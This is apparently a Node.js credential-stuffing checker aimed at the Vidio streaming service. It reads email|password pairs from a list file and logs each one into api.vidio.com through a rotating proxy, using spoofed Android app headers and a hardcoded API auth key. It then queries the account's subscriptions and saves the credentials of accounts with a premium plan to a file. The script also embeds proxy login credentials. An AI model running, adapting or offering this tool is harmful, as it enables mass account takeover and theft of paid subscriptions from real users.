import { v4 as uuidv4 } from "uuid";
import fetch from "node-fetch";
import chalk from "chalk";
import { HttpsProxyAgent } from "https-proxy-agent";
import fs from "fs-extra";

const curl = ({ endpoint, data, header, proxy, method = null }) =>
  new Promise((resolve, reject) => {
    let fetchData = {
      headers: header,
      agent: new HttpsProxyAgent(proxy),
    };
    if (method === "PATCH") {
      fetchData.method = "PATCH";
      fetchData.body = data;
    } else {
      if (data) {
        fetchData.method = "POST";
        fetchData.body = data;
      } else {
        fetchData.method = "GET";
      }
    }

    fetch(endpoint, fetchData)
      .then((res) => res)
      .then(async (res) => {
        const data = {
          cookie: await res.headers.raw(),
          respon: await res.json(),
          status: await res.status,
        };
        resolve(data);
      })
      .catch((err) => {
        reject(err);
      });
  });
function log(msg, type = "info") {
  const timestamp = new Date().toLocaleTimeString();
  switch (type) {
    case "success":
      console.log(`[${timestamp}] ➤  ${chalk.green(msg)}`);
      break;
    case "custom":
      console.log(`[${timestamp}] ➤  ${chalk.magenta(msg)}`);
      break;
    case "error":
      console.log(`[${timestamp}] ➤  ${chalk.red(msg)}`);
      break;
    case "warning":
      console.log(`[${timestamp}] ➤  ${chalk.yellow(msg)}`);
      break;
    default:
      console.log(`[${timestamp}] ➤  ${msg}`);
  }
}
function headers(visitor, token, email, tokenx) {
  if (!token) {
    return {
      Host: "api.vidio.com",
      "User-Agent": "vidioandroid/6.41.11-0703defa3c (3191426)",
      "Accept-Encoding": "gzip",
      referer: "android-app://com.vidio.android",
      "x-api-platform": "app-android",
      "x-api-auth": "laZOmogezono5ogekaso5oz4Mezimew1",
      "x-api-app-info": "android/7.1.2/6.41.11-0703defa3c-3191426",
      "accept-language": "en",
      "x-visitor-id": visitor,
    };
  } else {
    return {
      Host: "api.vidio.com",
      "User-Agent": "vidioandroid/6.41.11-0703defa3c (3191426)",
      "Accept-Encoding": "gzip",
      referer: "android-app://com.vidio.android",
      "x-api-platform": "app-android",
      "x-api-auth": "laZOmogezono5ogekaso5oz4Mezimew1",
      "x-api-app-info": "android/7.1.2/6.41.11-0703defa3c-3191426",
      "accept-language": "en",
      "x-user-email": email,
      "x-user-token": tokenx,
      "x-visitor-id": visitor,
      "x-authorization": token,
    };
  }
}
function filterNumber(phoneNumber) {
  // Jika dimulai dengan '62', hapus '62'
  if (phoneNumber.startsWith("62")) {
    return phoneNumber.slice(2);
  }
  // Jika dimulai dengan '0', ubah '0' menjadi kosong
  if (phoneNumber.startsWith("0")) {
    return phoneNumber.slice(1);
  }
  // Jika tidak memenuhi kondisi di atas, kembalikan nomor asli
  return phoneNumber;
}
(async () => {
  const data = fs.readFileSync("list.txt", "utf8").split("\n");
  for (let index = 0; index < data.length; index++) {
    try {
      const [email, password] = data[index].split("|");
      const visitor = uuidv4().toLocaleUpperCase();
      const proxyauth = `https://1a48601ad88d747d779b__cr.id:d536875334c6af36@gw.dataimpulse.com:823`;
      const loginVerrified = await curl({
        endpoint: "https://api.vidio.com/api/login",
        data: new URLSearchParams({
          login: email.trim(),
          password: password.trim(),
        }),
        header: headers(visitor, null),
        proxy: proxyauth,
      });

      const validasisubcription = await curl({
        endpoint: "https://api.vidio.com/api/users/subscriptions",
        data: null,
        header: headers(
          visitor,
          loginVerrified.respon.auth_tokens.access_token,
          loginVerrified.respon.auth.email,
          loginVerrified.respon.auth.authentication_token
        ),
        proxy: proxyauth,
      });
      const counts = validasisubcription.respon.subscriptions;
      if (counts.length > 0) {
        log(
          `Checking validate ${email} => ${validasisubcription.respon.subscriptions[0].package.name} =>  ${validasisubcription.respon.subscriptions[0].package.description} => ${validasisubcription.respon.subscriptions[0].end_at}`,
          "success"
        );
        fs.appendFileSync(
          "dataaccountpremi.txt",
          `${loginVerrified.respon.auth.email}|${password}\n`
        );
      } else {
        log(`Checking validate ${email} => not found subcription`, "error");
      }
    } catch (error) {
      console.log(error);
    }
  }
})();
